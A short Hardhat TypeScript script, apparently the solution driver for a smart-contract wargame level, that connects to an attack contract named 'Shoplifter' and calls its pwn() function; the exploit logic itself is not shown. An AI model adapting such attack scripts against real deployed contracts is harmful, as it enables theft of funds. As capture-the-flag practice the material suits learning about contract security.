import { ethers } from "hardhat"
import { LEVEL_ADDRESSES, PLAYER, ADDRESSES } from "../consts"
import { getSigner } from "../utils"
import { providers } from "ethers"

const pwn = async () => {
    const signer = await getSigner()
    const hack = await ethers.getContractAt(
        "contracts/Shop.sol:Shoplifter",
        ADDRESSES.shoplifter,
        signer
    )
    const pwn = await hack.pwn()
    await pwn.wait()
}

pwn()